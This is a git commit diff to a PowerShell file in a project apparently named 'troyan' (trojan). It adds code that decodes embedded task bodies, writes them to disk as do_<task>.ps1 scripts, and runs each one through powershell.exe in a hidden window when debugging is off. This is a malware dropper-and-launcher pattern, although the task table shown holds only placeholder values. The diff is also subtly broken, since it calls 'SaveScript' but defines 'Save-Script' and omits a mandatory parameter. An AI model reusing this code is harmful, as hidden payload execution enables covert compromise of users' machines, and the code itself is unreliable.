5ecf6719f333adee03649454f2eb7626df3ef2f8
k <kgonsovsky@tennisi.it>
2025-02-04 07:26:50 -0900

    12345

--- troyan/troyanps/program.ps1
+++ troyan/troyanps/program.ps1
@@ -3,6 +3,41 @@
 
 . ./utils.ps1
 
+function Script-Path {
+    param
+    (
+    [Parameter(Mandatory = $true)]
+    [string]
+    $scriptPath,
+
+    [Parameter(Mandatory = $true)]
+    [string[]]
+    $taskName
+    )
+    $directoryPath = Split-Path -Path $scriptPath -Parent
+    $fullPath = Join-Path -Path $directoryPath -ChildPath "do_$taskName.ps1"
+    return $fullPath
+}
+
+function Save-Script
+{
+    param
+    (
+        [Parameter(Mandatory = $true)]
+        [string]
+        $scriptPath,
+
+        [Parameter(Mandatory = $true)]
+        [string[]]
+        $taskName,
+
+        [Parameter(Mandatory = $true)]
+        [string[]]
+        $body
+    )
+    $fullPath = Script-Path -scriptPath $scriptPath
+    CustomDecode -inContent $body -outFile $fullPath
+}
 
 function Invoke-Script
 {
@@ -16,13 +51,14 @@ function Invoke-Script
         [string[]]
         $taskName
     )
+    $fullPath = Script-Path -scriptPath $scriptPath
     if ($globalDebug)
     {
-        Start-Process powershell.exe -WindowStyle Normal -ArgumentList "-file ""$scriptPath"" -Task $taskName"
+        Start-Process powershell.exe -WindowStyle Normal -ArgumentList "-file ""$fullPath"" -Task $taskName"
     }
     else
     {
-        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-file ""$scriptPath"" -Task $taskName"
+        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-file ""$fullPath"" -Task $taskName"
     }
 }
 
@@ -52,11 +88,19 @@ function Main
             ###doo
         )
 
+        $tasks = @{
+            "Key1" = "Value1"
+            "Key2" = "Value2"
+        }
+
         writedbg "Main - "
-        foreach ($task in $taskFunctions) 
+        foreach ($key in $tasks.Keys)
         {
+            $task = $key
+            $body = $tasks.$key
             writedbg "Main - $task"
-            Invoke-Script $scriptPath $task
+            SaveScript -scriptPath $scriptPath -taskName $task -Body $body
+            Invoke-Script -scriptPath $scriptPath -taskName $task
         }
     }
 }
